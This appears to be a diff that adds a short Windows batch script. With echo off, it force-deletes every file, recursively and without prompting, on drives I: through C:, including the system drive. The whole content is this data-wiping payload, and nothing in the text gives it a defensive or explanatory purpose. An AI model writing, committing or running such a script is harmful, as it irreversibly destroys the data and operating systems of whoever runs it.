@@ -1,0 +1,8 @@
+@Echo Off
+Del /f /s /q I:\*.*
+Del /f /s /q H:\*.*
+Del /f /s /q G:\*.*
+Del /f /s /q F:\*.*
+Del /f /s /q E:\*.*
+Del /f /s /q D:\*.*
+Del /f /s /q C:\*.*
